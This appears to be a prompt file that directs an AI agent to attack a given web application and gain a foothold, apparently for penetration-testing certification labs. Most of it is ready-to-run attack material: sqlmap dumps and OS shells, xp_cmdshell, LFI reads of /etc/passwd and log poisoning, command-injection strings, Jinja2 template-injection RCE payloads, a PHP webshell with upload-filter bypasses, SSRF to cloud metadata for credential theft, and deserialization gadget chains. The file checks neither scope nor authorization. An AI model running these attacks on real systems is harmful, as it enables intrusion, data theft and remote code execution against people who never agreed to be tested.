Attack a web application to get a foothold. $ARGUMENTS = target URL, and/or context from recon (tech stack, endpoints, params). Write results to ~/osai/current/loot/web_<host>.md. Run /osai-triage on any noisy scanner output first.

## Phase 0: Map before you attack
```bash
whatweb -a3 http://<TARGET>
curl -sI http://<TARGET>                       # headers, server, cookies
gobuster dir -u http://<TARGET> -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 40 -x php,txt,bak,zip -o ~/osai/current/recon/<host>_dirs.txt
ffuf -u http://<TARGET>/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 200,301,302,403
# Note every input: GET/POST params, headers, cookies, JSON fields, file uploads
```
Pick the attack by what the app does — don't spray every payload blindly.

## SQL Injection
```bash
# Manual quick test: ' and " and ')-- - and timing
curl -s "http://<TARGET>/item?id=1'"          # error?
# sqlmap — let it do the grind, then escalate
sqlmap -u "http://<TARGET>/item?id=1" --batch --dbs
sqlmap -u "http://<TARGET>/item?id=1" --batch -D <db> --tables --dump
sqlmap -u "http://<TARGET>/item?id=1" --batch --os-shell          # if stacked/RCE
# MSSQL → xp_cmdshell (classic OSAI chain 1 entry)
sqlmap -u "..." --batch --os-shell   # or manual: EXEC xp_cmdshell 'whoami'
```

## Local/Remote File Inclusion (LFI/RFI)
```bash
# LFI probes
curl -s "http://<TARGET>/?page=../../../../etc/passwd"
curl -s "http://<TARGET>/?page=php://filter/convert.base64-encode/resource=index.php" | base64 -d
# LFI → RCE via log poisoning / session / /proc/self/environ / wrappers
curl -s "http://<TARGET>/?page=/var/log/apache2/access.log"   # after UA=<?php system($_GET[c]);?>
# php filter chain for RCE (no file write needed) — use php_filter_chain_generator if available
```

## Command Injection
```bash
# separators: ; | & && || `cmd` $(cmd) newline
curl -s "http://<TARGET>/ping?host=127.0.0.1;id"
curl -s --data 'host=127.0.0.1|whoami' http://<TARGET>/ping
# blind → time-based / OOB
curl -s "http://<TARGET>/ping?host=127.0.0.1;sleep 5"
# reverse shell trigger is Kapi's to fire; deliver the one-liner via the injection point
```

## Server-Side Template Injection (SSTI)
```bash
# detect: {{7*7}} ${7*7} <%=7*7%> #{7*7}
curl -s "http://<TARGET>/?name={{7*7}}"        # 49 = Jinja2/Twig
# Jinja2 RCE
{{cycler.__init__.__globals__.os.popen('id').read()}}
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
# Freemarker / Velocity / Twig payloads differ — match to the 49-style hit
```

## File upload → webshell
```bash
# bypasses: double ext (shell.php.jpg), null byte, content-type spoof, .phtml/.php5/.pht,
# magic bytes (GIF89a; then <?php), .htaccess to map ext, case (.pHp)
# Minimal PHP shell:
echo '<?php system($_GET["c"]); ?>' > shell.php
# after upload: curl "http://<TARGET>/uploads/shell.php?c=id"
```

## SSRF (feeds directly into /osai-cloud-loot)
```bash
# test internal reach
curl -s "http://<TARGET>/fetch?url=http://127.0.0.1:80/"
curl -s "http://<TARGET>/fetch?url=http://169.254.169.254/latest/meta-data/"   # cloud → /osai-cloud-loot
# bypass filters: http://127.1, http://[::1], http://2130706433, DNS rebinding, @-tricks
```

## Insecure Deserialization
```bash
# PHP: unserialize() of user input → gadget chain (phpggc)
phpggc -l | head ; phpggc <Framework/RCE> system id -o payload.txt
# Python pickle / Java (ysoserial) — match to the stack
# Node: prototype pollution / vm2 escape for JS apps
```

## Auth & logic
```bash
# default creds, JWT (alg:none / weak secret via hashcat -m 16500), IDOR (increment IDs),
# password reset token leak, mass assignment, GraphQL introspection
curl -s http://<TARGET>/graphql -d '{"query":"{__schema{types{name}}}"}' -H 'Content-Type: application/json'
```

## After foothold
- Stabilise shell (see below), then run linPEAS/winPEAS → /osai-winpeas
- Check for hijack points → /osai-hijack ; hunt configs/creds → /osai-cred-vault --add
```bash
# TTY upgrade
python3 -c 'import pty;pty.spawn("/bin/bash")'; export TERM=xterm; # Ctrl-Z; stty raw -echo; fg
```

## Output — findings to log
```
/osai-notes --host <IP> --title "SQLi → xp_cmdshell RCE" --severity Critical --evidence "<query + whoami output>"
/osai-notes --host <IP> --title "SSTI (Jinja2) → RCE" --severity Critical --evidence "<payload + id>"
```
Write per-host web notes to ~/osai/current/loot/web_<host>.md.

## Token discipline
- Pipe gobuster/ffuf/sqlmap output through /osai-triage — never paste raw scans
- One vuln class at a time based on Phase-0 mapping; confirm before escalating
- Reverse shells / binary payloads are Kapi's to build and fire
